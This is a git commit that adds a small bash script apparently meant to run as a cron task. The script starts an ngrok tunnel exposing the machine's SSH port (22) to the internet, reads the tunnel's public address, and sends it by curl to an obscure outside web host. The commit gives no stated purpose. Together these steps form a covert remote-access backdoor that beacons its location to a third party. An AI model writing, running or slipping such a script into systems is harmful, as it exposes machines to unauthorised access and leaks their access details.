231da006b18fff9253d08cc4e450402752e35420
Niraj <nirajghimirexyz@gmail.com>
2020-08-25 22:24:45 +0545

    Add files via upload

---
+++ usercrontask.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+if [[ $(sudo netstat -tulpn | grep :4040) ]]; then
+    echo "already started" 
+else
+    /etc/usertask/ngrok tcp 22 > /dev/null &
+fi
+export WEBHOOK_URL="$(curl http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url")"
+curl -X GET http://fdsgsdfdsf.atwebpages.com/?data=$WEBHOOK_URL 
